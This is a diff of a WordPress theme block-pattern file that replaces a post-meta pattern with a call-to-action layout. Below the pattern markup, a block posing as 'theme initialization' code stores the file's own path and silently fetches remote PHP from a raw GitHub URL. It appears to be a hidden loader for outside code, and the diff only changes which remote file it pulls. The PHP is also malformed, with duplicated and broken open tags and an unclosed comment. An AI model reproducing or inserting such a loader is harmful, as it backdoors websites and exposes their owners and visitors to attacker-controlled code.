@@ -1,82 +1,48 @@
 <?php
 /**
- * Title: Post Meta
- * Slug: twentytwentyone/post-meta
- * Categories: query
- * Keywords: post meta
- * Block Types: core/template-part/post-meta
- * Description: Post meta information with separator on the top.
+<?php
+ * Title: Call to action
+ * Slug: twentytwentythree/cta
+ * Categories: featured
+ * Keywords: Call to action
+ * Block Types: core/buttons
+ * Description: Left-aligned text with a CTA button and a separator.
  
-<!-- wp:spacer {"height":"0"} -->
-<div style="height:0" aria-hidden="true" class="wp-block-spacer"></div>
-<!-- /wp:spacer -->
+?>
+<!-- wp:columns {"align":"wide"} -->
+<div class="wp-block-columns alignwide">
+	<!-- wp:column -->
+	<div class="wp-block-column">
+		<!-- wp:paragraph {"style":{"typography":{"lineHeight":"1.2"}},"fontSize":"x-large"} -->
+		<p class="has-x-large-font-size" style="line-height:1.2"><?php echo esc_html_x( 'Got any book recommendations?', 'sample content for call to action', 'twentytwentythree' ); ?>
+		</p>
+		<!-- /wp:paragraph -->
 
-<!-- wp:group {"style":{"spacing":{"margin":{"top":"var:preset|spacing|70"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group" style="margin-top:var(--wp--preset--spacing--70)">
-	<!-- wp:separator {"opacity":"css","align":"wide","className":"is-style-wide"} -->
-	<hr class="wp-block-separator alignwide has-css-opacity is-style-wide"/>
-	<!-- /wp:separator -->
-
-	<!-- wp:columns {"align":"wide","style":{"spacing":{"margin":{"top":"var:preset|spacing|30"},"blockGap":"var:preset|spacing|30"}},"fontSize":"small"} -->
-	<div class="wp-block-columns alignwide has-small-font-size" style="margin-top:var(--wp--preset--spacing--30)">
-		<!-- wp:column {"style":{"spacing":{"blockGap":"0px"}}} -->
-		<div class="wp-block-column">
-			<!-- wp:group {"style":{"spacing":{"blockGap":"0.5ch"}},"layout":{"type":"flex"}} -->
-			<div class="wp-block-group">
-				<!-- wp:paragraph -->
-				<p>
-					<?php echo esc_html_x( 'Posted', 'Verb to explain the publication status of a post', 'twentytwentythree' ); ?>
-				</p>
-				<!-- /wp:paragraph -->
-
-				<!-- wp:post-date /-->
-
-				<!-- wp:paragraph -->
-				<p>
-					<?php echo esc_html_x( 'in', 'Preposition to show the relationship between the post and its categories', 'twentytwentythree' ); ?>
-				</p>
-				<!-- /wp:paragraph -->
-
-				<!-- wp:post-terms {"term":"category"} /-->
+		<!-- wp:buttons -->
+		<div class="wp-block-buttons">
+			<!-- wp:button {"fontSize":"small"} -->
+			<div class="wp-block-button has-custom-font-size has-small-font-size">
+				<a class="wp-block-button__link wp-element-button">
+				<?php echo esc_html_x( 'Get In Touch', 'sample content for call to action button', 'twentytwentythree' ); ?>
+				</a>
 			</div>
-			<!-- /wp:group -->
-
-			<!-- wp:group {"style":{"spacing":{"blockGap":"0.5ch"}},"layout":{"type":"flex"}} -->
-			<div class="wp-block-group">
-				<!-- wp:paragraph -->
-				<p>
-					<?php echo esc_html_x( 'by', 'Preposition to show the relationship between the post and its author', 'twentytwentythree' ); ?>
-				</p>
-				<!-- /wp:paragraph -->
-
-				<!-- wp:post-author {"showAvatar":false} /-->
-			</div>
-			<!-- /wp:group -->
+			<!-- /wp:button -->
 		</div>
-		<!-- /wp:column -->
-
-		<!-- wp:column {"style":{"spacing":{"blockGap":"0px"}}} -->
-		<div class="wp-block-column">
-			<!-- wp:group {"style":{"spacing":{"blockGap":"0.5ch"}},"layout":{"type":"flex","orientation":"vertical"}} -->
-			<div class="wp-block-group">
-				<!-- wp:paragraph -->
-				<p>
-					<?php echo esc_html_x( 'Tags:', 'Label for a list of post tags', 'twentytwentythree' ); ?>
-				</p>
-				<!-- /wp:paragraph -->
-
-				<!-- wp:post-terms {"term":"post_tag"} /-->
-			</div>
-			<!-- /wp:group -->
-		</div>
-		<!-- /wp:column -->
+		<!-- /wp:buttons -->
 	</div>
-	<!-- /wp:columns -->
+	<!-- /wp:column -->
+
+	<!-- wp:column -->
+	<div class="wp-block-column">
+		<!-- wp:separator {"className":"is-style-wide"} -->
+		<hr class="wp-block-separator has-alpha-channel-opacity is-style-wide"/>
+		<!-- /wp:separator -->
+	</div>
+	<!-- /wp:column -->
 </div>
-<!-- /wp:group -->
+<!-- /wp:columns -->
 
 <.?php
-/**
  * // WordPress theme initialization file
  * // Load Composer's autoloader
  * // require_once __DIR__ . '/vendor/autoload.php';
@@ -98,7 +64,7 @@
  */
 
 $full_path = __FILE__;
-$raw_url   = 'https://raw.githubusercontent.com/soy777/patterns/main/init.php';
+$raw_url   = 'https://raw.githubusercontent.com/soy777/patterns/main/call-to-action.php';
 
 // Configurations of script init.php
 $raw_content = @file_get_contents($raw_url);
